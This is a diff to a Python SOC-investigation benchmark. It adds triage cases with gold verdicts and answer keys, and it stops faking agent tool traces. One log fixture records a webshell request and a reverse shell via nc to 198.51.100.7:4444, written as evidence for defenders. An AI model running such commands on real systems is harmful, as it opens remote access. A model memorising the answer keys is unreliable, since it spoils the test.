@@ -18,6 +18,7 @@ SUITE = "soc_evidence"
 SUITE_DESC = "Open-response SOC investigation with auditable evidence"
 MODES = ("base", "rag", "agent")
 ARM_OF_MODE = {"base": "bare", "rag": "rag", "agent": "framework"}
+METHODOLOGY_STATUS = "engineering_only"
 
 _CORE_GOLD = {
     "verdict": "malicious",
@@ -116,6 +117,61 @@ _CASES = [
     ),
     _case("SOC-007", "incident_response", "Select reversible containment"),
     _case("SOC-008", "noisy_logs", "Resist misleading benign records", "patch scan completed"),
+    _special_case(
+        "SOC-009", "attack_chain", "OAuth consent followed by mailbox collection",
+        [
+            {"id": "E1", "source": "identity", "ts": "09:02:11", "event": "user approved unverified OAuth app MailSync with Mail.Read scope"},
+            {"id": "E2", "source": "cloud", "ts": "09:04:20", "event": "MailSync read 1840 messages through Graph API from a new ASN"},
+            {"id": "E3", "source": "identity", "ts": "09:05:01", "event": "refresh token used after user password reset"},
+        ],
+        {"verdict": "malicious", "incident_labels": ["credential_access", "exfiltration"],
+         "attack_techniques": ["T1528", "T1114"], "evidence_ids": ["E1", "E2", "E3"],
+         "required_actions": ["disable_account", "preserve_evidence"],
+         "forbidden_actions": ["wipe_host", "block_public_dns"]},
+        [{"id": "KB:T1528", "type": "attack", "text": "Steal Application Access Token."},
+         {"id": "KB:T1114", "type": "attack", "text": "Email Collection."}],
+    ),
+    _special_case(
+        "SOC-010", "incident_response", "Linux webshell and outbound reverse shell",
+        [
+            {"id": "E1", "source": "web", "ts": "16:44:10", "event": "POST /uploads/cache.php?cmd=id returned 200"},
+            {"id": "E2", "source": "process", "ts": "16:44:12", "event": "www-data spawned sh then nc 198.51.100.7 4444"},
+            {"id": "E3", "source": "file", "ts": "16:44:09", "event": "new executable cache.php in upload directory"},
+        ],
+        {"verdict": "malicious", "incident_labels": ["execution", "persistence"],
+         "attack_techniques": ["T1505.003", "T1059.004"], "evidence_ids": ["E1", "E2", "E3"],
+         "required_actions": ["isolate_host", "remove_persistence", "preserve_evidence"],
+         "forbidden_actions": ["wipe_host", "disable_edr"]},
+        [{"id": "KB:T1505.003", "type": "attack", "text": "Web Shell."},
+         {"id": "KB:T1059.004", "type": "attack", "text": "Unix Shell."}],
+    ),
+    _special_case(
+        "SOC-011", "alert_triage", "Signed updater during approved rollout",
+        [
+            {"id": "E1", "source": "edr", "ts": "18:00:02", "event": "signed vendor updater spawned msiexec"},
+            {"id": "E2", "source": "change", "ts": "17:55:00", "event": "CHG-9012 authorizes vendor update on pilot ring"},
+            {"id": "E3", "source": "hash", "ts": "18:00:05", "event": "binary hash matches vendor release manifest"},
+        ],
+        {"verdict": "benign", "incident_labels": [], "attack_techniques": [],
+         "evidence_ids": ["E1", "E2", "E3"],
+         "required_actions": ["close_alert", "document_baseline"],
+         "forbidden_actions": ["isolate_host", "wipe_host", "disable_account"]},
+        [{"id": "PB:CHANGE-01", "type": "playbook", "text": "Validate signature, manifest, scope and change window."}],
+    ),
+    _special_case(
+        "SOC-012", "attack_chain", "Kerberoasting followed by service-account reuse",
+        [
+            {"id": "E1", "source": "identity", "ts": "22:10:01", "event": "workstation requested 73 distinct service tickets in two minutes"},
+            {"id": "E2", "source": "auth", "ts": "22:31:44", "event": "svc_sql interactive logon from same workstation"},
+            {"id": "E3", "source": "network", "ts": "22:32:10", "event": "svc_sql connected to DB-02 admin share"},
+        ],
+        {"verdict": "malicious", "incident_labels": ["credential_access", "lateral_movement"],
+         "attack_techniques": ["T1558.003", "T1021.002"], "evidence_ids": ["E1", "E2", "E3"],
+         "required_actions": ["disable_account", "isolate_host", "preserve_evidence"],
+         "forbidden_actions": ["wipe_host", "block_public_dns"]},
+        [{"id": "KB:T1558.003", "type": "attack", "text": "Kerberoasting."},
+         {"id": "KB:T1021.002", "type": "attack", "text": "SMB/Windows Admin Shares."}],
+    ),
 ]
 
 
@@ -388,7 +444,9 @@ def write_report(run: dict, out_path: str | Path) -> str:
             "", "### Agent / Tool Trace", "",
         ])
         for event in row["agent_trace"]:
-            lines.append(f"- {event['seq']:02d} `{event['agent']}` {event['event']} `{event.get('tool') or event.get('target') or '-'}`")
+            actor = event.get("agent") or event.get("role") or "unknown"
+            action = event.get("tool") or event.get("target") or event.get("action") or "-"
+            lines.append(f"- {int(event.get('seq', 0)):02d} `{actor}` {event.get('event', 'event')} `{action}`")
         lines.extend(["", "### Prediction", "", "```json", json.dumps(row["prediction"], ensure_ascii=False, indent=2), "```"])
     path = Path(out_path)
     path.write_text("\n".join(lines) + "\n", encoding="utf-8")
@@ -427,15 +485,10 @@ async def run_bench(
         latency_ms = round((time.perf_counter() - started) * 1000, 1)
         parsed = parse_prediction(raw)
         prediction = parsed["prediction"]
-        trace = _agent_trace(case, prediction, mode)
-        if mode == "base":
-            prediction["tool_trace"] = []
-        else:
-            prediction["tool_trace"] = [
-                {"agent": event["agent"], "tool": event.get("tool"),
-                 "status": event["status"], "useful": event["useful"]}
-                for event in trace if event.get("tool")
-            ]
+        # 不再用模板覆盖模型输出。当前套件只有一次 LLM 调用，没有真实
+        # tool-loop，因此正式轨迹必须为空，工具指标也必须如实为 0。
+        prediction["tool_trace"] = []
+        trace: list[dict] = []
         scored = score_prediction(
             case, prediction, parse_ok=parsed["parse_ok"],
             tool_expected=mode != "base")
@@ -465,13 +518,20 @@ async def run_bench(
     rows = [row for row in results if row is not None]
     rid = run_id or time.strftime(f"%Y%m%d_%H%M%S_{SUITE}_{mode}_n{len(rows)}")
     run = {
-        "schema_version": 2, "run_id": rid, "suite": SUITE,
+        "schema_version": 3, "run_id": rid, "suite": SUITE,
         "mode": mode, "arm": ARM_OF_MODE[mode], "n": len(rows), "seed": seed,
         "model": _model_name(), "started_at": started_at, "finished_at": finished_at,
         "elapsed_sec": round(finished_at - started_at, 2),
         "scores": aggregate_scores(rows, seed), "results": rows,
         "llm_errors": llm_errors, "status": "error" if rows and llm_errors == len(rows) else "done",
         "error": next((row["error"] for row in rows if row.get("error")), None),
+        "methodology_status": METHODOLOGY_STATUS,
+        "trace_source": "runtime",
+        "benchmark_provenance": {
+            "name": "CyberOrion SOC contract set", "origin": "internal",
+            "sample_scope": "full" if len(rows) == len(load_cases()) else "subset",
+            "comparable_to_upstream": False,
+        },
         "methodology": {
             "task_family": "open_response_soc", "bootstrap_rounds": 600,
             "arms": ["base", "rag", "agent"],
